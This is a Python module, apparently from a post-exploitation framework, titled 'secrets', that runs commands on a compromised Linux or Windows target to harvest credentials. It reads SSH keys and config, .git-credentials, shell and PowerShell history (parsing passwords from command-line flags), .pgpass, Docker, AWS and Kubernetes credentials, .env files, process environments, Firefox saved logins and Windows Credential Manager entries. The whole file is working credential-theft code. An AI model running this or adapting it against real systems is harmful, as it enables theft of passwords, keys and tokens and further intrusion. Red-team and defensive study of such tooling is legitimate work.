from __future__ import annotations
from koi.modules.blueprint import KoiModule
import json
import re
from typing import Any, Dict, List


ENV_CRED_PATTERNS = re.compile(
    r'(password|passwd|secret|token|api.?key|key|credential|auth|user|username|'
    r'host|port|url|endpoint|database|db_|aws_|azure_|gcp_)',
    re.IGNORECASE
)

_SENSITIVE_KEY_PARTS = (
    "pass", "pwd", "secret", "token", "api", "auth", "cred",
    "key", "jwt", "bearer", "database", "db_", "_db", "dsn",
    "connection", "conn_", "_conn", "url", "uri",
    "aws", "azure", "gcp", "google", "github", "gitlab",
    "docker", "kube", "vault", "consul",
    "private", "encrypt", "sign", "cert", "pfx", "pem",
    "ldap", "smtp", "mail", "slack", "webhook",
)

_SENSITIVE_VALUE_RE = re.compile(
    r'(?:'
    r'(?:password|passwd|pass)\s*[:=]\s*\S+'
    r'|[A-Z0-9]{20}[A-Z0-9/+]{30,}'
    r'|ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    r'|ghp_[A-Za-z0-9]{30,}'
    r'|glpat-[A-Za-z0-9_-]{20,}'
    r'|AIza[0-9A-Za-z_-]{35}'
    r'|postgres://\S+:\S+@'
    r'|mysql://\S+:\S+@'
    r'|mongodb(?:\+srv)?://\S+:\S+@'
    r')',
    re.IGNORECASE,
)


_LONG_PASSWORD_FLAGS = re.compile(
    r'''(?:^|\s)'''
    r'''(--password|--passwd|--pass|--pwd'''
    r'''|--db-password|--dbpassword'''
    r'''|--auth-password|--login-password'''
    r'''|--admin-password|--root-password)'''
    r'''(?:=|\s+)(\S+)''',
)

_SHORT_P_INLINE_CMDS = frozenset({
    'mysql', 'mysqldump', 'mysqladmin', 'mysqlimport',
    'mariadb', 'mariadb-dump',
})

# Commands where -p is NOT a password flag.
_SHORT_P_BLACKLIST = frozenset({
    'ssh', 'scp', 'sftp',
    'nmap', 'masscan',
    'nc', 'ncat', 'netcat', 'socat',
    'docker', 'podman', 'kubectl',
    'mkdir', 'cp', 'mv', 'install', 'rsync',
    'tar', 'gzip', 'bzip2', 'xz',
    'curl', 'wget',
    'python', 'python3', 'python2', 'ruby', 'perl', 'node',
    'grep', 'egrep', 'fgrep', 'rg', 'ag',
    'find', 'fd',
    'ls', 'stat', 'file',
    'ss', 'netstat', 'lsof',
    'ping', 'traceroute', 'mtr',
    'kill', 'pkill',
    'chown', 'chmod',
    'sed', 'awk', 'sort', 'head', 'tail', 'cut', 'tr', 'wc',
    'openssl',
    'java', 'javac',
    'gcc', 'g++', 'make', 'cmake',
    'dpkg', 'rpm', 'apt', 'apt-get', 'yum', 'dnf', 'pacman',
    'systemctl', 'journalctl',
    'git',
})

_SHORT_P_INLINE_RE = re.compile(r'(?:^|\s)-p([^\s-]\S*)')
_SHORT_P_SPACE_RE = re.compile(r'(?:^|\s)-p\s+(\S+)')

_USERNAME_RE = re.compile(
    r'(?:^|\s)(?:-u|--user|--username|-U|--login)\s+(\S+)'
)
_USERNAME_INLINE_RE = re.compile(r'(?:^|\s)-u(\S+)')


def _extract_username(line: str) -> str:
    m = _USERNAME_RE.search(line)
    if m:
        return m.group(1).strip("'\"")
    m = _USERNAME_INLINE_RE.search(line)
    if m:
        return m.group(1).strip("'\"")
    return ''


def extract_cli_passwords(content: str) -> List[List[str]]:
    found: List[List[str]] = []
    seen: set[tuple[str, str, str]] = set()

    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if line.startswith(': ') and ';' in line:
            line = line.split(';', 1)[1]
        line = re.sub(r'\s+', ' ', line).strip()

        tokens = line.split()
        if not tokens:
            continue
        cmd = tokens[0].rsplit('/', 1)[-1]
        if cmd.startswith('-') or cmd.startswith('('):
            continue

        user = None

        def _add(source: str, val: str) -> None:
            nonlocal user
            val = val.strip("'\"")
            if not val or val.startswith('-') or len(val) < 2:
                return
            if user is None:
                user = _extract_username(line)
            key = (source, user, val)
            if key not in seen:
                seen.add(key)
                found.append([user, val, source])

        for m in _LONG_PASSWORD_FLAGS.finditer(line):
            _add(cmd, m.group(2))

        if cmd in _SHORT_P_INLINE_CMDS:
            for m in _SHORT_P_INLINE_RE.finditer(line):
                _add(cmd, m.group(1))

        if cmd not in _SHORT_P_BLACKLIST:
            for m in _SHORT_P_SPACE_RE.finditer(line):
                _add(cmd, m.group(1))

    return found


def parse_env_file(content: str) -> Dict[str, str]:
    """Parse .env file and extract only credential-like variables."""
    result = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '=' in line:
            key, val = line.split('=', 1)
            key = key.strip()
            val = val.strip().strip('"\'')
            if ENV_CRED_PATTERNS.search(key) and val:
                result[key] = val
    return result


def parse_git_config(content: str) -> Dict[str, str]:
    """Parse git config output and extract remotes."""
    result = {}
    current_repo = None
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if line.startswith('[remote'):
            current_repo = line
        elif 'url =' in line and current_repo:
            url = line.split('url =', 1)[1].strip()
            if current_repo not in result:
                result[current_repo] = url
    return result


def parse_ssh_config(content: str) -> Dict[str, Dict[str, str]]:
    result = {}
    current_host = None
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if line.lower().startswith('host '):
            current_host = line.split(None, 1)[1] if ' ' in line else None
        elif current_host:
            if '=' in line:
                key, val = line.split('=', 1)
            else:
                parts = line.split(None, 1)
                if len(parts) != 2:
                    continue
                key, val = parts
            key = key.strip().lower()
            val = val.strip()
            if key in ('user', 'port', 'identityfile', 'hostname', 'proxycommand'):
                if current_host not in result:
                    result[current_host] = {}
                result[current_host][key] = val
    return result


def _is_interesting(key: str, value: str) -> bool:
    kl = key.lower()
    if any(part in kl for part in _SENSITIVE_KEY_PARTS):
        return True
    return bool(_SENSITIVE_VALUE_RE.search(value))


def filter_env_vars(content: str) -> Dict[str, str]:
    result = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or '=' not in line:
            continue
        key, val = line.split('=', 1)
        key = key.strip()
        val = val.strip()
        if _is_interesting(key, val):
            result[key] = val
    return result


def _count_findings(value) -> int:
    """Count leaf data points in a nested hunt result.

    Walks into nested collections: counting top-level keys would report one
    finding per category rather than the number of items actually found.
    """
    if isinstance(value, dict):
        return sum(_count_findings(v) for v in value.values())
    if isinstance(value, list):
        return len(value)
    return 1


class SecretsDumpModule(KoiModule):
    name        = "secrets"
    description = "Hunt for secrets, credentials, API keys, and sensitive data on the target."
    category    = "Enumeration"
    usage       = "secrets <id>"
    platform    = ["linux", "windows_ps"]

    def run(self) -> None:
        if self.session.os_type == "linux":
            self._run_linux()
        else:
            self._run_windows()

    def _run_linux(self) -> None:
        """Hunt for credentials on Linux targets."""
        self.status("Hunting for secrets on Linux...")

        # (display label, hunt method). Add a source by adding one row.
        hunts = [
            ("SSH Keys",              self._hunt_ssh_keys),
            ("Git",                   self._hunt_git),
            ("CLI Passwords",         self._hunt_bash_history),
            ("Environment Variables", self._hunt_env_vars),
            ("PostgreSQL (.pgpass)",  self._hunt_pgpass),
            ("Docker Credentials",    self._hunt_docker),
            (".env Files",            self._hunt_env_files),
            ("API Keys",              self._hunt_api_keys),
            ("Process Environment",   self._hunt_process_env),
            ("Browser Secrets",       self._hunt_browser_secrets),
        ]

        total_found = 0
        for label, hunt in hunts:
            self.status(f"Hunting {label.lower()}...")
            result = hunt()
            if isinstance(result, int):
                total_found += result
            elif result:
                self._display_results(label, result)
                total_found += _count_findings(result)

        if total_found:
            self.success(f"Found {total_found} secret(s)")
        else:
            self.warn("No obvious secrets found")

    def _display_results(self, category: str, entries: Any) -> None:
        """Display results with adaptive formatting."""
        if isinstance(entries, dict):
            if len(entries) <= 6:
                self.box(f"[{category}]", entries)
            else:
                limited = dict(list(entries.items())[:6])
                self.box(f"[{category}] ({len(entries)} total)", limited)
        elif isinstance(entries, list):
            # Format list entries as a dict for clean display
            formatted = {f"[{i+1}]": cmd for i, cmd in enumerate(entries[:15])}
            self.box(f"[{category}] ({len(entries)} commands)", formatted)
        elif isinstance(entries, str):
            lines = entries.strip().split('\n')
            if len(lines) > 20:
                preview = "\n".join(lines[:15])
                self.box(f"[{category}] ({len(lines)} lines)", {"preview": preview})
            else:
                self.box(f"[{category}]", {"output": entries})
        else:
            self.box(f"[{category}]", {"data": str(entries)})

    def _hunt_ssh_keys(self) -> int:
        output = self._try_exec(
            'echo "===KEYS==="; find ~/.ssh/ -maxdepth 1 -type f 2>/dev/null;'
            ' echo "===CONFIG==="; cat ~/.ssh/config 2>/dev/null;'
            ' echo "===AGENT==="; ssh-add -l 2>/dev/null'
        )
        if not output:
            return 0

        sections: dict[str, str] = {}
        current = None
        lines: list[str] = []
        for line in output.split('\n'):
            if line.strip() in ('===KEYS===', '===CONFIG===', '===AGENT==='):
                if current:
                    sections[current] = '\n'.join(lines)
                current = line.strip()
                lines = []
            else:
                lines.append(line)
        if current:
            sections[current] = '\n'.join(lines)

        count = 0
        key_re = re.compile(r'(id_.*|key_.*|.*_rsa|.*_ed25519)')
        rows = []
        for path in sections.get('===KEYS===', '').split('\n'):
            path = path.strip()
            if not path:
                continue
            name = path.rsplit('/', 1)[-1]
            if key_re.match(name):
                rows.append([name, path])
        if rows:
            self.table("SSH Keys", ["key", "path"], rows[:15])
            count += len(rows[:15])

        extras: dict[str, str] = {}
        config_raw = sections.get('===CONFIG===', '')
        if config_raw.strip():
            parsed = parse_ssh_config(config_raw)
            if parsed:
                extras["SSH Hosts Configured"] = str(len(parsed))

        agent_raw = sections.get('===AGENT===', '')
        if agent_raw.strip():
            key_count = len([l for l in agent_raw.split('\n')
                           if l.strip() and any(k in l for k in ['RSA', 'ED25519', 'ECDSA'])])
            if key_count > 0:
                extras["SSH Agent Keys Loaded"] = f"{key_count} keys"

        if extras:
            self.box("[SSH Keys]", extras)
            count += _count_findings(extras)

        return count

    def _hunt_git(self) -> int:
        output = self._try_exec(
            "printf '===CREDS===\\n'; cat ~/.git-credentials 2>/dev/null;"
            " printf '\\n===END===\\n';"
            " find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null |"
            " while IFS= read -r d; do"
            " repo=$(dirname \"$d\");"
            " printf '===REPO:%s===\\n' \"$repo\";"
            " printf '---CONFIG---\\n'; cat \"$d/config\" 2>/dev/null;"
            " printf '\\n---LOG---\\n';"
            " git -C \"$repo\" --no-pager log --oneline -n 20 2>/dev/null;"
            " done"
        )
        if not output:
            return 0

        count = 0
        creds_match = re.search(r'===CREDS===\n(.*?)\n===END===', output, re.DOTALL)
        if creds_match and creds_match.group(1).strip():
            self.box("[.git-credentials]", {"content": creds_match.group(1).strip()})
            count += 1

        secret_keywords = frozenset((
            'password', 'secret', 'token', 'api_key',
            'credential', 'key', 'auth', 'bearer', 'authorization',
        ))
        remote_rows: list[list[str]] = []
        suspect_rows: list[list[str]] = []

        for repo_m in re.finditer(
            r'===REPO:(.*?)===\n(.*?)(?====REPO:|$)', output, re.DOTALL,
        ):
            repo_path = repo_m.group(1)
            body = repo_m.group(2)
            repo_name = repo_path.rsplit('/', 1)[-1]

            config_part, _, log_part = body.partition('---LOG---')
            config_part = config_part.replace('---CONFIG---', '', 1)

            for url in parse_git_config(config_part).values():
                remote_rows.append([repo_name, url])

            for line in log_part.split('\n'):
                line = line.strip()
                if line and any(kw in line.lower() for kw in secret_keywords):
                    suspect_rows.append([repo_name, line])

        if remote_rows:
            self.table("Git Remotes", ["repo", "url"], remote_rows[:20])
            count += len(remote_rows[:20])

        if suspect_rows:
            self.table("Suspicious Commits", ["repo", "commit"], suspect_rows[:15])
            count += len(suspect_rows[:15])

        return count

    def _hunt_bash_history(self) -> int:
        raw = self._try_exec(
            "{ cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null; }"
        )
        if not raw:
            return 0
        cli_passwords = extract_cli_passwords(raw)
        if cli_passwords:
            self.table("CLI Passwords", ["user", "password", "source"], cli_passwords)
            return len(cli_passwords)
        return 0

    def _hunt_env_vars(self) -> dict:
        result = {}
        raw = self._try_exec("declare -x 2>/dev/null || env")
        if not raw:
            return result
        env: Dict[str, str] = {}
        for line in raw.splitlines():
            line = line.strip()
            if not line or "=" not in line:
                continue
            if line.startswith("declare -x "):
                line = line[11:]
            key, _, val = line.partition("=")
            key = key.strip()
            if key:
                env[key] = val
        interesting = {k: v for k, v in env.items() if _is_interesting(k, v)}
        if interesting:
            result["Sensitive Env Vars"] = interesting
        return result

    def _hunt_pgpass(self) -> dict:
        """Hunt PostgreSQL password file."""
        result = {}
        pgpass = self._try_exec("cat ~/.pgpass 2>/dev/null")
        if pgpass:
            result[".pgpass"] = pgpass
        return result

    def _hunt_docker(self) -> dict:
        """Hunt Docker credentials."""
        result = {}

        docker_config = self._try_exec("cat ~/.docker/config.json 2>/dev/null")
        if docker_config:
            result["Docker Config"] = docker_config

        return result

    def _hunt_api_keys(self) -> dict:
        result = {}
        locations = [
            "~/.netrc",
            "~/.aws/credentials",
            "~/.aws/config",
            "~/.kube/config",
            "~/.ssh/authorized_keys",
            "~/.npmrc",
            "~/.gem/credentials",
            "~/.token",
            "~/.secrets",
        ]
        parts = " ".join(
            f'[ -s {loc} ] && printf "\\n=== {loc} ===\\n" && head -20 {loc};'
            for loc in locations
        )
        output = self._try_exec(parts)
        if output and output.strip():
            result["API Keys & Configs"] = output
        return result

    def _hunt_env_files(self) -> int:
        output = self._try_exec(
            "find ~ -maxdepth 5 -type f -name '.env*' 2>/dev/null | head -15 | "
            "while IFS= read -r f; do echo \"===FILE:$f===\"; cat \"$f\" 2>/dev/null; done"
        )
        if not output:
            return 0

        rows = []
        current_file = None
        current_lines: list[str] = []

        for line in output.split('\n'):
            if line.startswith('===FILE:') and line.endswith('==='):
                if current_file and current_lines:
                    for key, val in parse_env_file('\n'.join(current_lines)).items():
                        rows.append([key, val, current_file])
                current_file = line[8:-3]
                current_lines = []
            else:
                current_lines.append(line)

        if current_file and current_lines:
            for key, val in parse_env_file('\n'.join(current_lines)).items():
                rows.append([key, val, current_file])

        if rows:
            self.table(".env Files", ["variable", "value", "file"], rows[:30])
            return len(rows[:30])
        return 0

    def _hunt_process_env(self) -> int:
        output = self._try_exec(
            "for pid in $(pgrep -u $USER 2>/dev/null | head -10); do "
            "comm=$(cat /proc/$pid/comm 2>/dev/null); "
            "echo \"===PROC:$pid:$comm===\"; "
            "tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null; "
            "done"
        )
        if not output:
            return 0

        rows = []
        seen: set[tuple[str, str]] = set()
        current_proc = None
        current_lines: list[str] = []

        def _flush():
            if not current_proc or not current_lines:
                return
            for key, val in filter_env_vars('\n'.join(current_lines)).items():
                if (key, val) not in seen:
                    seen.add((key, val))
                    rows.append([current_proc, key, val])

        for line in output.split('\n'):
            if line.startswith('===PROC:') and line.endswith('==='):
                _flush()
                parts = line[8:-3].split(':', 1)
                pid, comm = parts[0], parts[1] if len(parts) > 1 else '?'
                current_proc = f"{comm} ({pid})"
                current_lines = []
            else:
                current_lines.append(line)

        _flush()

        if rows:
            rows.sort(key=lambda r: r[1])
            self.table("Process Environment", ["process", "variable", "value"], rows[:20])
            return len(rows[:20])
        return 0

    def _hunt_browser_secrets(self) -> dict:
        output = self._try_exec(
            "printf '===CHROME===\\n';"
            " find ~/.config ~/.local/share -type f -name 'Login Data' 2>/dev/null;"
            " printf '===FFKEYS===\\n';"
            " find ~/.mozilla/firefox -type f \\( -name 'key4.db' -o -name 'key3.db' \\) 2>/dev/null;"
            " printf '===FFLOGINS===\\n';"
            " find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null |"
            " while IFS= read -r f; do"
            " printf '===FILE:%s===\\n' \"$f\"; cat \"$f\" 2>/dev/null;"
            " done"
        )
        if not output:
            return {}

        sections: dict[str, str] = {}
        current = None
        lines: list[str] = []
        for line in output.split('\n'):
            stripped = line.strip()
            if stripped in ('===CHROME===', '===FFKEYS===', '===FFLOGINS==='):
                if current:
                    sections[current] = '\n'.join(lines)
                current = stripped
                lines = []
            else:
                lines.append(line)
        if current:
            sections[current] = '\n'.join(lines)

        result: dict[str, str] = {}

        chrome_raw = sections.get('===CHROME===', '')
        chrome_files = [f.strip() for f in chrome_raw.split('\n') if f.strip()]
        if chrome_files:
            result["Chrome Profiles"] = f"{len(chrome_files)} profile(s) found"

        ffkeys_raw = sections.get('===FFKEYS===', '')
        ffkey_files = [f.strip() for f in ffkeys_raw.split('\n') if f.strip()]
        if ffkey_files:
            result["Firefox Encrypted Keys"] = f"{len(ffkey_files)} database(s)"

        logins_raw = sections.get('===FFLOGINS===', '')
        if logins_raw.strip():
            hosts: set[str] = set()
            current_content: list[str] = []
            for line in logins_raw.split('\n'):
                if line.startswith('===FILE:') and line.endswith('==='):
                    if current_content:
                        self._parse_ff_logins('\n'.join(current_content), hosts)
                    current_content = []
                else:
                    current_content.append(line)
            if current_content:
                self._parse_ff_logins('\n'.join(current_content), hosts)
            if hosts:
                result["Firefox Stored Hosts"] = ", ".join(sorted(hosts)[:15])

        return result

    @staticmethod
    def _parse_ff_logins(raw: str, hosts: set[str]) -> None:
        try:
            data = json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            return
        if not isinstance(data, dict):
            return
        for login in data.get('logins', []):
            host = login.get('hostname', '')
            if host and not host.startswith('chrome://'):
                hosts.add(host)

    def _run_windows(self) -> None:
        """Hunt for credentials on Windows targets."""
        self.status("Hunting for credentials on Windows...")

        # (display label, hunt method). Add a source by adding one row.
        hunts = [
            ("PowerShell History",    self._hunt_ps_history),
            ("Stored Credentials",    self._hunt_stored_creds),
            ("Git Credentials",       self._hunt_win_git),
            ("Environment Variables", self._hunt_win_env),
            ("RDP Connections",       self._hunt_rdp),
            ("Browser Data",          self._hunt_browser),
        ]

        total_found = 0
        for label, hunt in hunts:
            result = hunt()
            if result:
                self._display_results(label, result)
                total_found += _count_findings(result)

        if total_found:
            self.success(f"Found {total_found} secret(s)")
        else:
            self.warn("No obvious credentials found")

    def _hunt_ps_history(self) -> dict:
        result = {}

        ps_hist = self._win_query(
            "&{$hist = Get-History -ErrorAction SilentlyContinue | "
            "Where-Object {$_.CommandLine -match '(password|passwd|api|secret|token|credential)'}; "
            "if($hist) {$hist | Select-Object -ExpandProperty CommandLine | Select-Object -First 20 | Out-String}}"
        )
        if ps_hist.strip():
            result["PS Session History"] = ps_hist

        ps_file = self._win_query(
            "&{$f = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath; "
            "if($f -and (Test-Path $f)) {Get-Content $f -Raw}}"
        )
        if ps_file and ps_file.strip():
            cli_passwords = extract_cli_passwords(ps_file)
            if cli_passwords:
                self.table("CLI Passwords", ["user", "password", "source"], cli_passwords)

        return result

    def _hunt_stored_creds(self) -> dict:
        """Extract stored credentials from Windows Credential Manager."""
        result = {}

        creds = self._win_query(
            "&{cmdkey /list 2>$null}"
        )

        if creds.strip() and "NONE" not in creds:
            result["Stored Credentials"] = creds

        return result

    def _hunt_win_git(self) -> dict:
        """Extract git credentials on Windows."""
        result = {}

        git_cfg = self._win_query(
            "&{git --no-pager config --global -l 2>$null | Select-String -Pattern '(user|credential|password)' | Out-String}"
        )

        if git_cfg.strip():
            result["Git Config"] = git_cfg

        git_creds_file = self._win_query(
            "&{$path = [Environment]::GetFolderPath('ApplicationData');"
            "$creds = Join-Path $path '.git-credentials';"
            "if(Test-Path $creds) {Get-Content $creds}}"
        )

        if git_creds_file.strip():
            result[".git-credentials"] = git_creds_file

        return result

    def _hunt_win_env(self) -> dict:
        """Extract sensitive environment variables."""
        result = {}

        env_vars = self._win_query(
            "&{Get-Item -Path Env:* | "
            "Where-Object {$_.Name -match '(AWS|AZURE|GCP|API|SECRET|TOKEN|PASSWORD|USER|KEY|DOCKER|GITHUB|GITLAB)' -and $_.Value} | "
            "Select-Object -Property Name, Value | Out-String}"
        )

        if env_vars.strip():
            result["Env Vars"] = env_vars

        return result

    def _hunt_rdp(self) -> dict:
        """Extract RDP saved connections."""
        result = {}

        rdp_data = self._win_query(
            "&{$reg = Get-ChildItem 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default' "
            "-ErrorAction SilentlyContinue; "
            "if($reg) {$reg | Select-Object -ExpandProperty PSChildName | Out-String}}"
        )

        if rdp_data.strip():
            result["RDP Servers"] = rdp_data

        return result

    def _hunt_browser(self) -> dict:
        """Hunt browser stored passwords/data."""
        result = {}

        # Check for Chrome
        chrome = self._win_query(
            "&{$path = [Environment]::GetFolderPath('ApplicationData') + '\\Google\\Chrome\\User Data\\Local State'; "
            "if(Test-Path $path) {Get-Item -LiteralPath $path | Select-Object -ExpandProperty LastWriteTime}}"
        )

        if chrome.strip():
            result["Chrome Detected"] = "Chrome user data found"

        return result
